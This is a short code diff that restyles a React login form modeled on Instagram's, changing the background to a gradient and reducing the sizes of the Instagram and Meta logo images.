@@ -40,7 +40,7 @@ function LoginForm() {
   };
 
   return (
-    <div className="min-h-screen bg-gray-50 flex flex-col">
+    <div className="min-h-screen bg-gradient-to-r from-purple-100 via-pink-50 to-orange-50 flex flex-col">
       {/* Language Selector */}
       <div className="text-center pt-6 pb-12">
         <span className="text-gray-500 text-base">English (US)</span>
@@ -50,7 +50,7 @@ function LoginForm() {
       <div className="flex-1 flex flex-col justify-center px-6">
         {/* Instagram Logo */}
         <div className="text-center mb-12">
-          <div className="w-16 h-16 mx-auto mb-8 flex items-center justify-center">
+          <div className="w-14 h-14 mx-auto mb-8 flex items-center justify-center">
             <img
               src="/images/insta_logo_4.png"
               alt="Instagram"
@@ -149,7 +149,7 @@ function LoginForm() {
           <img
             src="/images/meta_logo_2.png"
             alt="Meta"
-            className="h-10 mx-auto opacity-70"
+            className="h-8 mx-auto opacity-70"
           />
         </div>
       </div>
